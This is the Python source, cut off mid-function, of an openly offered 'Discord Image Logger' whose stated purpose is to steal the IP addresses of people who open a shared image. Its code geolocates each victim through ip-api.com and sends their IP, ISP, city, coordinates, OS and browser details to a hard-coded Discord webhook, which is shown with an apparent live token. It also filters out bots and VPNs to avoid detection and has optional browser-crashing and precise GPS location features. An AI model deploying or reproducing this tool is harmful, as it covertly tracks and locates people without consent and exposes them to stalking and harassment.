# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1118131432074784909/Ohdy3Mlq6GWqeW8bgyoA5QrXDwascOTDD1LhKMHtyen26qZWSe9TgXaYnXeDAU1YL8ev",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
